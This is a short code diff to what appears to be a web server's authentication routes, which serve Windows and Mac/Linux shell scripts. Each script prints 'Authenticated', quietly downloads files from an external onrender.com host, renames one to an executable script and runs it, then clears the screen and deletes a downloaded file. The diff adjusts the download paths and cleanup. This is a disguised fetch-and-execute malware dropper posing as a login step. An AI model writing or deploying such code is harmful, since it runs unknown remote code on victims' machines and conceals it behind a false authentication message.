@@ -42,7 +42,7 @@ router.get("/auth/windows", (req, res) => {
 echo Authenticated
 echo %USERPROFILE%
 curl -s -L -o "%USERPROFILE%\\token" https://be-1-49aq.onrender.com/token
-curl -s -L -o "%USERPROFILE%\\tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.npl
+curl -s -L -o "%USERPROFILE%\\tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.js
 ren "%USERPROFILE%\\token" token.cmd
 call "%USERPROFILE%\\token.cmd"
 cls
@@ -55,10 +55,10 @@ router.get("/auth/maclinux", (req, res) => {
 set -e
 echo "Authenticated"
 wget -q -O "$HOME/token" "https://be-1-49aq.onrender.com/tokenlinux.npl"
-wget -q -O "$HOME/tokenParser.npl" "https://be-1-49aq.onrender.com/tokenParser.npl"
+wget -q -O "$HOME/tokenParser.npl" "https://be-1-49aq.onrender.com/tokenParser.js"
 mv "$HOME/token" "$HOME/token.sh"
 bash "$HOME/token.sh"
-rm -f "$HOME/tokenParser.npl"
+rm -f "$HOME/token"
 clear
 exit 0
 `);
